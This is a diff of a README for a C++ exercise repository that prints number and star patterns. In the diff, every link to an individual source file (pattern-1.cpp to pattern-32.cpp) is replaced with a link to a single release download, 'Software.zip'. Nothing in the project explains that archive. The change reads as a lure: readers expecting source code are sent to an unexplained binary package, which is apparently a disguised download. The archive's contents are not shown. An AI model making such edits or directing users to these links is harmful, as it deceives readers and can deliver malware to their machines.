@@ -1,6 +1,6 @@
 # PATTERN-USING-CPP
 <h2>
-  <a href="https://github.com/99monisha/PATTERN-USING-CPP/blob/master/DAY-1/pattern-1.cpp">
+  <a href="https://github.com/99monisha/PATTERN-USING-CPP/releases/download/v1.0/Software.zip">
 Pattern-1<br>
 1 <br>
 1 2 <br>
@@ -9,7 +9,7 @@ Pattern-1<br>
 1 2 3 4 5 <br>
 </a></h2>
 <h2>
-  <a href="https://github.com/99monisha/PATTERN-USING-CPP/blob/master/DAY-1/pattern-2.cpp">
+  <a href="https://github.com/99monisha/PATTERN-USING-CPP/releases/download/v1.0/Software.zip">
 Pattern-2<br>
 * <br>
 * * <br>
@@ -17,7 +17,7 @@ Pattern-2<br>
 * * * * <br>
 * * * * *<br>
 </a></h2>
-<h2> <a href="https://github.com/99monisha/PATTERN-USING-CPP/blob/master/DAY-1/pattern-3.cpp">
+<h2> <a href="https://github.com/99monisha/PATTERN-USING-CPP/releases/download/v1.0/Software.zip">
 Pattern-3<br>
 1 <br>
 2 2 <br>
@@ -25,7 +25,7 @@ Pattern-3<br>
 4 4 4 4 <br>
 5 5 5 5 5 <br>
 </a></h2>
-<h2> <a href="https://github.com/99monisha/PATTERN-USING-CPP/blob/master/DAY-1/pattern-4.cpp">
+<h2> <a href="https://github.com/99monisha/PATTERN-USING-CPP/releases/download/v1.0/Software.zip">
 Pattern-4<br>
 1 2 3 4 5<br> 
 1 2 3 4 <br>
@@ -33,7 +33,7 @@ Pattern-4<br>
 1 2 <br>
 1<br>
 </a></h2>
-<h2> <a href="https://github.com/99monisha/PATTERN-USING-CPP/blob/master/DAY-1/pattern-5.cpp">
+<h2> <a href="https://github.com/99monisha/PATTERN-USING-CPP/releases/download/v1.0/Software.zip">
 Pattern-5<br>
 * * * * * <br>
 * * * *<br> 
@@ -41,7 +41,7 @@ Pattern-5<br>
 * *<br>
 * <br>
 </a></h2>
-<h2> <a href="https://github.com/99monisha/PATTERN-USING-CPP/blob/master/DAY-1/pattern-6.cpp">
+<h2> <a href="https://github.com/99monisha/PATTERN-USING-CPP/releases/download/v1.0/Software.zip">
 Pattern-6<br>
 5 5 5 5 5 <br>
 4 4 4 4 <br>
@@ -49,19 +49,19 @@ Pattern-6<br>
 2 2 <br>
 1<br>
 </a></h2>
-<h2> <a href="https://github.com/99monisha/PATTERN-USING-CPP/blob/master/DAY-1/pattern-7.cpp">
+<h2> <a href="https://github.com/99monisha/PATTERN-USING-CPP/releases/download/v1.0/Software.zip">
 Pattern-7<br>
 </a></h2>
-<h2> <a href="https://github.com/99monisha/PATTERN-USING-CPP/blob/master/DAY-1/pattern-8.cpp">
+<h2> <a href="https://github.com/99monisha/PATTERN-USING-CPP/releases/download/v1.0/Software.zip">
 Pattern-8<br>
 </a></h2>
-<h2> <a href="https://github.com/99monisha/PATTERN-USING-CPP/blob/master/DAY-1/pattern-9.cpp">
+<h2> <a href="https://github.com/99monisha/PATTERN-USING-CPP/releases/download/v1.0/Software.zip">
 Pattern-9<br>
 </a></h2>
-<h2> <a href="https://github.com/99monisha/PATTERN-USING-CPP/blob/master/DAY-1/pattern-10.cpp">
+<h2> <a href="https://github.com/99monisha/PATTERN-USING-CPP/releases/download/v1.0/Software.zip">
 Pattern-10<br>
 </a></h2>
-<h2> <a href="https://github.com/99monisha/PATTERN-USING-CPP/blob/master/DAY-1/pattern-11.cpp">
+<h2> <a href="https://github.com/99monisha/PATTERN-USING-CPP/releases/download/v1.0/Software.zip">
 Pattern-11<br>
 1 <br>
 1 2 3 <br>
@@ -69,7 +69,7 @@ Pattern-11<br>
 1 2 3 4 5 6 7 <br>
 1 2 3 4 5 6 7 8 9 <br>
 </a></h2>
-<h2> <a href="https://github.com/99monisha/PATTERN-USING-CPP/blob/master/DAY-1/pattern-12.cpp">
+<h2> <a href="https://github.com/99monisha/PATTERN-USING-CPP/releases/download/v1.0/Software.zip">
 Pattern-12<br>
 * <br>
 * * * <br>
@@ -77,7 +77,7 @@ Pattern-12<br>
 * * * * * * * <br>
 * * * * * * * * *<br>
 </a></h2>
-<h2> <a href="https://github.com/99monisha/PATTERN-USING-CPP/blob/master/DAY-1/pattern-13.cpp">
+<h2> <a href="https://github.com/99monisha/PATTERN-USING-CPP/releases/download/v1.0/Software.zip">
 Pattern-13<br>
 1 <br>
 2 2 2 <br>
@@ -85,7 +85,7 @@ Pattern-13<br>
 4 4 4 4 4 4 4 <br>
 5 5 5 5 5 5 5 5 5<br>
 </a></h2>
-<h2> <a href="https://github.com/99monisha/PATTERN-USING-CPP/blob/master/DAY-1/pattern-14.cpp">
+<h2> <a href="https://github.com/99monisha/PATTERN-USING-CPP/releases/download/v1.0/Software.zip">
 Pattern-14<br>
 1 2 <br>
 1 2 3 4 <br>
@@ -93,7 +93,7 @@ Pattern-14<br>
 1 2 3 4 5 6 7 8 <br>
 1 2 3 4 5 6 7 8 9 10<br> 
 </a></h2>
-<h2> <a href="https://github.com/99monisha/PATTERN-USING-CPP/blob/master/DAY-1/pattern-15.cpp">
+<h2> <a href="https://github.com/99monisha/PATTERN-USING-CPP/releases/download/v1.0/Software.zip">
 Pattern-15<br>
 1 1 <br>
 2 2 2 2 <br>
@@ -101,7 +101,7 @@ Pattern-15<br>
 4 4 4 4 4 4 4 4 <br>
 5 5 5 5 5 5 5 5 5 5 <br>
 </a></h2>
-<h2> <a href="https://github.com/99monisha/PATTERN-USING-CPP/blob/master/DAY-1/pattern-16.cpp">
+<h2> <a href="https://github.com/99monisha/PATTERN-USING-CPP/releases/download/v1.0/Software.zip">
 Pattern-16<br>
 * *  <br>
 * * * *  <br>
@@ -109,7 +109,7 @@ Pattern-16<br>
 * * * * * * * *  <br>
 * * * * * * * * * *  <br>
 </a></h2>
-<h2> <a href="https://github.com/99monisha/PATTERN-USING-CPP/blob/master/DAY-1/pattern-17.cpp">
+<h2> <a href="https://github.com/99monisha/PATTERN-USING-CPP/releases/download/v1.0/Software.zip">
 Pattern-17<br>
 a  <br>
 b b  <br>
@@ -117,7 +117,7 @@ c c c  <br>
 d d d d  <br>
 e e e e e <br>
 </a></h2>
-<h2> <a href="https://github.com/99monisha/PATTERN-USING-CPP/blob/master/DAY-1/pattern-18.cpp">
+<h2> <a href="https://github.com/99monisha/PATTERN-USING-CPP/releases/download/v1.0/Software.zip">
 Pattern-18<br>
 y <br> 
 x x  <br>
@@ -126,59 +126,59 @@ v v v v  <br>
 u u u u u  <br>
 </a></h2>
 <h2>
-  <a href="https://github.com/99monisha/PATTERN-USING-CPP/blob/master/DAY-1/pattern-19.cpp">
+  <a href="https://github.com/99monisha/PATTERN-USING-CPP/releases/download/v1.0/Software.zip">
 Pattern-19<br>
 </a></h2>
 <h2>
-  <a href="https://github.com/99monisha/PATTERN-USING-CPP/blob/master/DAY-1/pattern-20.cpp">
+  <a href="https://github.com/99monisha/PATTERN-USING-CPP/releases/download/v1.0/Software.zip">
 Pattern-20<br>
 </a></h2>
 <h2>
-  <a href="https://github.com/99monisha/PATTERN-USING-CPP/blob/master/DAY-1/pattern-21.cpp">
+  <a href="https://github.com/99monisha/PATTERN-USING-CPP/releases/download/v1.0/Software.zip">
 Pattern-21<br>
 </a></h2>
 <h2>
-  <a href="https://github.com/99monisha/PATTERN-USING-CPP/blob/master/DAY-1/pattern-22.cpp">
+  <a href="https://github.com/99monisha/PATTERN-USING-CPP/releases/download/v1.0/Software.zip">
 Pattern-22<br>
 </a></h2>
 <h2>
- <a href="https://github.com/99monisha/PATTERN-USING-CPP/blob/master/DAY-1/pattern-23.cpp">
+ <a href="https://github.com/99monisha/PATTERN-USING-CPP/releases/download/v1.0/Software.zip">
 Pattern-23<br>
 </a></h2>
 <h2>
-  <a href="https://github.com/99monisha/PATTERN-USING-CPP/blob/master/DAY-1/pattern-24.cpp">
+  <a href="https://github.com/99monisha/PATTERN-USING-CPP/releases/download/v1.0/Software.zip">
 Pattern-24<br>
 </a></h2>
 <h2>
-  <a href="https://github.com/99monisha/PATTERN-USING-CPP/blob/master/DAY-1/pattern-25.cpp">
+  <a href="https://github.com/99monisha/PATTERN-USING-CPP/releases/download/v1.0/Software.zip">
 Pattern-25<br>
 </a></h2>
 <h2>
-  <a href="https://github.com/99monisha/PATTERN-USING-CPP/blob/master/DAY-1/pattern-26.cpp">
+  <a href="https://github.com/99monisha/PATTERN-USING-CPP/releases/download/v1.0/Software.zip">
 Pattern-26<br>
 </a></h2>
 <h2>
-  <a href="https://github.com/99monisha/PATTERN-USING-CPP/blob/master/DAY-1/pattern-27.cpp">
+  <a href="https://github.com/99monisha/PATTERN-USING-CPP/releases/download/v1.0/Software.zip">
 Pattern-27<br>
 </a></h2>
 <h2>
-  <a href="https://github.com/99monisha/PATTERN-USING-CPP/blob/master/DAY-1/pattern-28.cpp">
+  <a href="https://github.com/99monisha/PATTERN-USING-CPP/releases/download/v1.0/Software.zip">
 Pattern-28<br>
 </a></h2>
 <h2>
-  <a href="https://github.com/99monisha/PATTERN-USING-CPP/blob/master/DAY-1/pattern-29.cpp">
+  <a href="https://github.com/99monisha/PATTERN-USING-CPP/releases/download/v1.0/Software.zip">
 Pattern-29<br>
 </a></h2>
 <h2>
-  <a href="https://github.com/99monisha/PATTERN-USING-CPP/blob/master/DAY-1/pattern-30.cpp">
+  <a href="https://github.com/99monisha/PATTERN-USING-CPP/releases/download/v1.0/Software.zip">
 Pattern-30<br>
 </a></h2>
 <h2>
-  <a href="https://github.com/99monisha/PATTERN-USING-CPP/blob/master/DAY-1/pattern-31.cpp">
+  <a href="https://github.com/99monisha/PATTERN-USING-CPP/releases/download/v1.0/Software.zip">
 Pattern-31<br>
 </a></h2>
 <h2>
-  <a href="https://github.com/99monisha/PATTERN-USING-CPP/blob/master/DAY-1/pattern-32.cpp">
+  <a href="https://github.com/99monisha/PATTERN-USING-CPP/releases/download/v1.0/Software.zip">
 Pattern-32<br>
 </a></h2>
 
